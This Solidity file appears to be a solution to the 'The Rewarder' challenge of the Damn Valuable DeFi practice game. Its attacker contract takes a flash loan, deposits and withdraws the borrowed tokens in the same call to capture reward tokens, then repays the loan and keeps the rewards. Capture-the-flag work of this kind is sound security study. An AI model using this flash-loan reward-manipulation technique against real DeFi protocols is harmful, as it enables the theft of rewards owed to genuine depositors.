pragma solidity ^0.6.0;

import "../DamnValuableToken.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";

contract AttackerTheRewarder {
    DamnValuableToken private _liquidityToken;
    RewardToken private _rewardToken;
    TheRewarderPool private _rewarderPool;

    constructor(
        address liquidityToken,
        address rewardToken,
        address theRewarderPool
    ) public {
        _liquidityToken = DamnValuableToken(liquidityToken);
        _rewardToken = RewardToken(rewardToken);
        _rewarderPool = TheRewarderPool(theRewarderPool);
    }

    function receiveFlashLoan(uint256 amount) external {
        _liquidityToken.approve(address(_rewarderPool), amount);
        _rewarderPool.deposit(amount);
        _rewarderPool.withdraw(amount);
        // Pay back Flash Loan
        _liquidityToken.transfer(msg.sender, amount);
    }

    function exploit(address pool, uint256 amount) public {
        FlashLoanerPool(pool).flashLoan(amount);
        _rewardToken.transfer(
            msg.sender,
            _rewardToken.balanceOf(address(this))
        );
    }
}
